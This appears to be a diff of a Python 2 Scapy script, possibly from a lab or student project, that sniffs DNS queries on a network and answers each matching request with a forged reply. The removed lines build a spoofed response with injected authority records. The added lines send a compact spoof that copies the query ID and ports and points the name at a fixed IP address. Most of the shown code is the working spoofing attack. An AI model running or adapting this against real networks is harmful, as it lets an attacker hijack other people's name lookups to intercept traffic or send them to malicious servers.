@@ -20,30 +20,12 @@ def maFonction(a):
     if (a[DNS].qr==0L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
         msg = msg + ' <-- REQUEST for ' + a[DNS].qd[0].qname
         print msg
-        src = a[IP].dst
-        dst = a[IP].src
-        rrname=a[DNS].qd[0].qname
-        id=a[DNS].id
-        d = DNS()
-        d.qr = 1      #1 for Response
-        d.opcode = 16
-        d.aa = 0
-        d.tc = 0
-        d.rd = 0
-        d.ra = 1
-        d.z = 8
-        d.rcode = 0
-        d.qdcount = 1      #Question Count
-        d.ancount = 1      #Answer Count
-        d.nscount = 1      #No Name server info
-        d.arcount = 1      #No additional records
-        d.qd = str(a[DNS].qd)
-        d.an = DNSRR(rrname=rrname, ttl=330, type="A", rclass="IN", rdata="127.0.0.1")
-        d.ns = DNSRR(rrname ='129.104.201.53', type = "NS", ttl = 86400, rdata = "radius.polytechnique.fr")
-        d.ar = DNSRR(rrname = "radius.polytechnique.fr", type = "A", ttl = 86400, rdata = ip_autorite)
-        dbis=DNS(qr=d.qr,opcode=d.opcode,aa=d.aa,tc=d.tc,rd=d.rd,ra=d.ra,z=d.z,rcode=d.rcode,qdcount=d.qdcount,ancount=d.ancount,nscount=d.nscount,arcount=d.arcount,qd=a[DNS].qd,an=d.an,ns=d.ns)
-        spoofed = IP(src=src, dst=dst)/UDP()/dbis
-        sendp(spoofed)
+        spoofed_pkt = IP(dst=a[IP].src, src=a[IP].dst)/\
+                      UDP(dport=a[UDP].sport, sport=a[UDP].dport)/\
+                      DNS(id=a[DNS].id, qd=a[DNS].qd, aa = 1, qr=1, \
+                      an=DNSRR(rrname=a[DNS].qd.qname,  ttl=10, rdata='129.104.221.35'))
+        send(spoofed_pkt)
+
     if (a[DNS].qr==1L) and ((a[IP].src == filtre) or (a[IP].dst == filtre) or (filtre == '-a')):
         msg = msg + ' <-- ANSWER: ' + a[DNS].an[0].rdata
         print msg
